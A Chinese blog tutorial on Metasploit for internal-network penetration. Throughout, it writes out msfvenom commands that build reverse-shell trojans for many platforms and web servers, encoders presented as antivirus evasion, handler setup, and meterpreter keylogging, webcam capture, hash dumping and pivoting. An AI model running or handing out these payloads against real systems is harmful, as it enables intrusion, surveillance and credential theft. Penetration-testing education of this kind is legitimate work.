+++
title = "【渗透神器】Metasploit基本用法"
author = "Hzllaga"
date =   2018-07-20 
description = "今天玩了一把内网渗透，其中主要用到了metasploit这款内网渗透神器。metasploit大家肯定不陌生，我也在很早之前就有接触过，但每次重新使用它时都会遗忘一些用法，因此为了方便查询我在本篇记录下metasploit神器的一些常用命令，以及内网渗透中如何使用它。"
categories = ["转载"]
tags = ["Metasploit","Payload"]
+++

今天玩了一把内网渗透，其中主要用到了metasploit这款内网渗透神器。metasploit大家肯定不陌生，我也在很早之前就有接触过，但每次重新使用它时都会遗忘一些用法，因此为了方便查询我在本篇记录下metasploit神器的一些常用命令，以及内网渗透中如何使用它。
## Mac下安装metasploit

mac下安装metasploit比较简单，官网下载pkg安装包，直接安装即可；需要注意的是安装完成后的路径。
msfconsole路径：
{{< highlight shell >}}
/opt/metasploit-framework/bin
{{< /highlight >}}
该目录下还有其他几个常用的工具：

![](https://cdn.wtfsec.org/img/20200223180345.jfif)

msf的插件路径：
{{< highlight shell >}}
/opt/metasploit-framework/embedded/framework/modules/exploits
{{< /highlight >}}
## msfvenom

作用：生成木马文件，替代早期版本的msfpayload和msfencoder。

### Options

msfvenom命令行选项如下：
{{< highlight shell >}}
-p, --payload    <payload>       指定需要使用的payload(攻击荷载)
-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all
-n, --nopsled    <length>        为payload预先指定一个NOP滑动长度
-f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
-a, --arch       <architecture>  指定payload的目标架构
    --platform   <platform>      指定payload的目标平台
-s, --space      <length>        设定有效攻击荷载的最大长度
-b, --bad-chars  <list>          设定规避字符集，比如: &#039;\x00\xff&#039;
-i, --iterations <count>         指定payload的编码次数
-c, --add-code   <path>          指定一个附加的win32 shellcode文件
-x, --template   <path>          指定一个自定义的可执行文件作为模板
-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
    --payload-options            列举payload的标准选项
-o, --out   <path>               保存payload
-v, --var-name <name>            指定一个自定义的变量，以确定输出格式
    --shellest                   最小化生成payload
-h, --help                       查看帮助选项
    --help-formats               查看msf支持的输出格式列表
{{< /highlight >}}
### options usage

查看支持的payload列表：
{{< highlight shell >}}
msfvenom -l payloads
{{< /highlight >}}
查看支持的输出文件类型：
{{< highlight shell >}}
msfvenom --help-formats
{{< /highlight >}}
查看支持的编码方式：(为了达到免杀的效果)
{{< highlight shell >}}
msfvenom -l encoders
{{< /highlight >}}
查看支持的空字段模块：(为了达到免杀的效果)
{{< highlight shell >}}
msfvenom -l nops
{{< /highlight >}}
### 基础payload

命令格式
{{< highlight shell >}}
msfvenom -p <payload> <payload options> -f <format> -o <path>
{{< /highlight >}}
Linux

反向连接：
{{< highlight shell >}}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
{{< /highlight >}}
正向连接：
{{< highlight shell >}}
msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<Target IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
{{< /highlight >}}
Windows
{{< highlight shell >}}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
{{< /highlight >}}

Mac
{{< highlight shell >}}
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
{{< /highlight >}}
Web Payloads

PHP
{{< highlight shell >}}
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
{{< /highlight >}}
ASP
{{< highlight shell >}}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
{{< /highlight >}}
JSP
{{< highlight shell >}}
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
{{< /highlight >}}
WAR
{{< highlight shell >}}
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
{{< /highlight >}}
Scripting Payloads

Python
{{< highlight shell >}}
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
{{< /highlight >}}
Bash
{{< highlight shell >}}
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
{{< /highlight >}}
Perl
{{< highlight shell >}}
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
{{< /highlight >}}
Linux Based Shellcode
{{< highlight shell >}}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
{{< /highlight >}}
Windows Based Shellcode
{{< highlight shell >}}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
{{< /highlight >}}
Mac Based Shellcode
{{< highlight shell >}}
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
{{< /highlight >}}
Handlers
### payload加编码

命令格式：
{{< highlight shell >}}
msfvenom -p <payload> <payload options> -a <arch> --platform <platform> -e <encoder option> -i <encoder times> -b <bad-chars> -n <nopsled> -f <format> -o <path>
{{< /highlight >}}
常用编码：
{{< highlight shell >}}
x86/shikata_ga_nai
cmd/powershell_base64
{{< /highlight >}}
例子：
{{< highlight shell >}}
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 -f exe > 1.exe
{{< /highlight >}}
### 自选模块

生成执行计算器payload例子：
{{< highlight shell >}}
msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > 1.exe
{{< /highlight >}}
### payload的坑

正常情况下，利用msfvenom生成的木马文件，可直接上传到目标服务器上运行（加权限）。但我自己遇到过一个坑，生成的文件内容有部分是无用的，会引起报错，如下图所示。
![](https://cdn.wtfsec.org/img/20200223180832.jfif)


解决方案是vim文件，删除文件开头两行无效的内容。
## msfconsole

作用：用来在命令行下启动metasploit。

![](https://cdn.wtfsec.org/img/20200223180854.jfif)

启动后可看到metasploit当前版本，以及各个模块的插件数量。

    auxiliary扫描模块
    exploits漏洞利用模块
    payloads
    encoders编码模块
    nops空字符模块

### search寻找模块

比如寻找ms15_034漏洞的利用插件
{{< highlight shell >}}
search ms15_034
{{< /highlight >}}
![](https://cdn.wtfsec.org/img/20200223180945.jfif)

## 配合木马弹Shell

前面我介绍了如何使用msfvenom生成木马文件，这里我介绍如何使用msf连接上被执行的木马文件，达到控制目标服务器。
### 常用payload

首先我们回顾一下生成木马文件的命令，其中有一个payload的选项，常用的几个payload。
linux相关payload：
{{< highlight shell >}}
linux/x86/meterpreter/reverse_tcp
linux/x86/meterpreter/bind_tcp
linux/x86/shell_bind_tcp
linux/x86/shell_reverse_tcp
linux/x64/shell_reverse_tcp
linux/x64/shell_bind_tcp
{{< /highlight >}}
windows相关payload:
{{< highlight shell >}}
windows/meterpreter/reverse_tcp
windows/meterpreter/bind_tcp
windows/shell_reverse_tcp
windows/shell_bind_tcp
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/bind_tcp
windows/x64/shell_reverse_tcp
windows/x64/shell_bind_tcp
{{< /highlight >}}
注意：含有x64只适用目标服务器为64位操作系统的，没有x64或者使用x86的只适用32位操作系统；含有meterpreter的模块会反弹meterpreter_shell，而普通的shell模块只会反弹普通的shell（反弹结果跟nc类似）；reverse_tcp表示木马会主动连接目标服务器，bind_tcp表示木马会监听本地的端口，等待攻击者连接。因此生成的木马文件，要根据具体情况而定。
### payload选择

前面介绍了常用的payload，那么payload选择的三大要素如下：

    木马连接的方向
    目标操作系统及版本
    反弹的shell类型

木马连接方向：
msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试，详细参考：[【渗透神器系列】nc](https://thief.one/%2F2017%2F04%2F10%2F1%2F)）

目标操作系统类型查看：这个不说了！
操作系统位数查看：
{{< highlight shell >}}
getconf LONG_BIT
{{< /highlight >}}
反弹shell类型：
这个主要取决于反弹的shell的用途，一般执行系统命令的话普通操作系统的shell就够了。如果想要使用高级功能，比如：键盘记录，开启摄像头，添加路由等功能，可以使用meterpreter_shell。
### 连接木马

开启msf，启用exploit/multi/handler模块。
{{< highlight shell >}}
use exploit/multi/handler
set payload linux/x86/meterpreter/bind_tcp
show options
set RHOST 10.0.0.1
set LPORT 12345  
exploit
{{< /highlight >}}

![](https://cdn.wtfsec.org/img/20200223181206.jfif)

注意：这里set的payload跟生成木马使用的payload要一致，其余的参数根据选择的payload而填写。
## meterpreter shell

当我们拿到目标服务器的meterpreter_shell后，可以进行很多操作。
{{< highlight shell >}}
backgroud 将msf进程放到后台
session -i 1 将进程拖回前台运行
run vnc 远程桌面的开启
{{< /highlight >}}
文件管理功能：
{{< highlight shell >}}
Download     下载文件
Edit          编辑
cat           查看
mkdir         创建
mv            移动
rm            删除
upload        上传         
rmdir         删除文件夹
{{< /highlight >}}
网络及系统操作：
{{< highlight shell >}}
Arp          看ARP缓冲表
Ifconfig     IP地址网卡
Getproxy     获取代理
Netstat      查看端口链接
Kill         结束进程
Ps           查看进程
Reboot       重启电脑
Reg          修改注册表
Shell        获取shell
Shutdown     关闭电脑
sysinfo      获取电脑信息
{{< /highlight >}}
用户操作和其他功能讲解:
{{< highlight shell >}}
enumdesktops     用户登录数
keyscan_dump　　 键盘记录－下载
keyscan_start　　键盘记录　－　开始
keyscan_stop 　　键盘记录　－　停止
Uictl　　　　　　获取键盘鼠标控制权
record_mic　　　 音频录制
webcam_chat　　　查看摄像头接口
webcam_list　　　查看摄像头列表
webcam_stream　　摄像头视频获取
Getsystem　　　　获取高权限
Hashdump　　　   下载ＨＡＳＨ
{{< /highlight >}}

## meterpreter添加路由

大多时候我们获取到的meterpreter shell处于内网，而我们需要代理到目标内网环境中，扫描其内网服务器。这时可以使用route功能，添加一条通向目标服务器内网的路由。

查看shell网络环境：
{{< highlight shell >}}
meterpreter>run get_local_subnets
{{< /highlight >}}
添加一条通向目标服务器内网的路由
{{< highlight shell >}}
meterpreter>run autoroute -s 100.0.0.0/8 (根据目标内网网络而定)
{{< /highlight >}}
查看路由设置：
{{< highlight shell >}}
meterpreter>run autoroute –p
{{< /highlight >}}
一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf>，查看下外面的路由情况。
{{< highlight shell >}}
route print
{{< /highlight >}}
如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。
{{< highlight shell >}}
msf>route add 10.0.0.0 255.0.0.0 1
{{< /highlight >}}
说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。
### meterpreter端口转发

假设目前我们扫描到了10网段的某个ip存在mysql弱口令，账号密码都有了，那么我们可以在肉鸡服务器上登陆目标服务器mysql。当然，如果我想在攻击机上去登陆mysql，可以使用端口转发。（某些情况下，内网的机器也不能互相ssh，需要登陆堡垒机）

在meterpreter shell中输入：
{{< highlight shell >}}
meterpreter > portfwd add -l 55555 -r 10.0.0.1 -p 3306
{{< /highlight >}}
表示将10.0.0.1服务器上的3306端口转发到本地的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。

网络上关于metasploit用法的资料很多，这里主要记录一些常用用法，以及个人使用过程中的一些坑

参考文章：
http://www.freebuf.com/sectool/72135.html
http://blog.csdn.net/lzhd24/article/details/50664342
http://blog.csdn.net/qq_34457594/article/details/52756458
http://www.freebuf.com/sectool/56432.html
http://www.freebuf.com/articles/network/125278.html
